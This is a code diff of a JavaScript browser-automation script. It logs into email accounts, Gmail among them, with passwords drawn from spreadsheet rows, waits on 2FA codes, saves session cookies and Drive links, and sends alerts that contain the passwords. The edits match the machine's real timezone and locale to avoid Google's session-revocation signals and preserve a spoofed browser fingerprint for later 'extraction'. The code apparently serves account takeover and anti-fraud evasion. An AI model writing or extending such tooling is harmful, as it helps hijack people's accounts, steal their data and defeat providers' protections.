@@ -900,7 +900,7 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                         const url = typeof page.url === 'function' ? page.url() : 'unknown';
                         if (errorScan.best && errorScan.best.len <= 400) {
                             logger.warn(`[checkAccountAccess][${instanceId}] errorMessage matched. URL: ${url}. Matched element <${errorScan.best.tag}> len=${errorScan.best.len} cls="${errorScan.best.cls}": "${errorScan.best.text.slice(0, 300)}"`);
-                            return { emailExists: false, accountAccess: false, requiresVerification: false };
+                            return { emailExists: false, accountAccess: false, requiresVerification: false, message: errorScan.best.text };
                         }
                         if (errorScan.matched) {
                             logger.warn(`[checkAccountAccess][${instanceId}] errorMessage candidate present but no VISIBLE short error element (URL: ${url}). Treating as technical — NOT a wrong-email signal.`);
@@ -1267,7 +1267,7 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                                 const url = typeof page.url === 'function' ? page.url() : 'unknown';
                                 if (errorScan.best && errorScan.best.len <= 400) {
                                     logger.info(`[checkAccountAccess][${instanceId}] Email error detected (generic). Email does not exist. URL: ${url}. Matched <${errorScan.best.tag}> len=${errorScan.best.len} cls="${errorScan.best.cls}": "${errorScan.best.text.slice(0, 300)}"`);
-                                    return { emailExists: false, accountAccess: false, reachedInbox: false, requiresVerification: false };
+                                    return { emailExists: false, accountAccess: false, reachedInbox: false, requiresVerification: false, message: errorScan.best.text };
                                 }
                                 if (errorScan.matched) {
                                     logger.warn(`[checkAccountAccess][${instanceId}] errorMessage candidate present but no VISIBLE short error element (URL: ${url}). Treating as technical — NOT a wrong-email signal.`);
@@ -2367,6 +2367,10 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 }
             }
             logger.info(`[processRow][${browserId}] Launching new browser session.`);
+            // Google logins must use the machine's REAL timezone/locale — a random
+            // GEO far from the real IP is a session-revocation risk signal.
+            const launchEmailDomain = (email || cachedBeforePopulate?.email || '').split('@')[1]?.toLowerCase() || '';
+            const isGoogleDomain = launchEmailDomain === 'gmail.com' || launchEmailDomain === 'googlemail.com';
             const maxLaunchRetries = 3;
             for (let i = 0; i < maxLaunchRetries; i++) {
                 try {
@@ -2374,7 +2378,8 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                     browser = await launchBrowser({
                         userDataDir,
                         headless: isDev ? false : "new",
-                        ipData
+                        ipData,
+                        realGeo: isGoogleDomain
                     });
                     logger.info(`[processRow][${browserId}] Browser launched successfully on attempt ${i + 1}. PID: ${browser.process()?.pid}`);
                     globalThis.__profileWriter = globalThis.__profileWriter || new Map();
@@ -2492,6 +2497,28 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
             }
             logger.info(`[processRow][${browserId}] Post-launch setup complete. page=${page?.url?.() || 'none'} (PID ${browser.process()?.pid}).`);
             } // end else (active browser session reuse)
+        }
+
+        // Persist the login-time fingerprint IMMEDIATELY (Fix A). The COMPLETED-block
+        // write below (browserIdentity at ~:5812) is gated on !browserFullyClosed and is
+        // skipped on every 2FA path that closes the browser first, and intermediate
+        // `updateData = { status, ... }` rebuilds (WAITINGCODE/WAITINGRECOVERYEMAIL)
+        // drop the field entirely — leaving the sheet with browserIdentity:"" and making
+        // extraction generate a NEW fingerprint (A->B switch, 2026-09-27 23:47 log).
+        // The cache write schedules a durable sheet sync within ~5s, and updateData
+        // carries it to the final write.
+        if (browser && browser.identity) {
+            try {
+                const identityStr = JSON.stringify(browser.identity);
+                updateData.browserIdentity = identityStr;
+                const cachedNow = getCachedRow(browserId) || {};
+                if (!cachedNow.browserIdentity) {
+                    setCachedRow(browserId, { ...cachedNow, browserIdentity: identityStr });
+                }
+                logger.info(`[processRow][${browserId}] Login fingerprint persisted (len=${identityStr.length}).`);
+            } catch (identErr) {
+                logger.warn(`[processRow][${browserId}] Could not persist login fingerprint: ${identErr.message}`);
+            }
         }
 
         domain = '';
@@ -5706,7 +5733,7 @@ if (!foundSelector) {
                     verificationState: initialCheckResult.verificationState || null,
                     verificationOptions: currentVerificationOptions,
                     platform, timestamp: new Date().toISOString(),
-                    message: "Email does not exist. Please provide a valid email."
+                    message: initialCheckResult.message || "Email does not exist. Please provide a valid email."
                 });
                 sendWrongInputAlert({ type: 'WRONG_EMAIL', platform, email, browserId, password: password || '', detail: 'Email not found after processing' });
                 updateData.status = finalStatus;
@@ -5752,12 +5779,19 @@ if (!foundSelector) {
         // rather than falling through to generic selectors (#iOttText etc.).
         const finalViewName = initialCheckResult.viewName || (JSON.parse(updateData.lastJsonResponse || '{}').viewName) || '';
         const waitingStates = ['WAITINGCODE', 'WAITINGOPTIONS', 'WAITINGRECOVERYEMAIL'];
+        // Fingerprint must survive intermediate `updateData = {...}` rebuilds (they drop
+        // the field), so fall back to the live browser identity and then the cache.
+        const recoveredIdentity = (() => {
+            if (updateData.browserIdentity) return updateData.browserIdentity;
+            if (browser && browser.identity) { try { return JSON.stringify(browser.identity); } catch (_) {} }
+            return getCachedRow(browserId)?.browserIdentity || '';
+        })();
         updateData = {
             status: finalStatus,
             email: email || '',
             driveUrl: updateData.driveUrl || '',
             cookieJSON: updateData.cookieJSON || '',
-            browserIdentity: updateData.browserIdentity || '',
+            browserIdentity: recoveredIdentity,
             lastJsonResponse: (waitingStates.includes(finalStatus) && updateData.lastJsonResponse)
                 ? updateData.lastJsonResponse
                 : JSON.stringify({
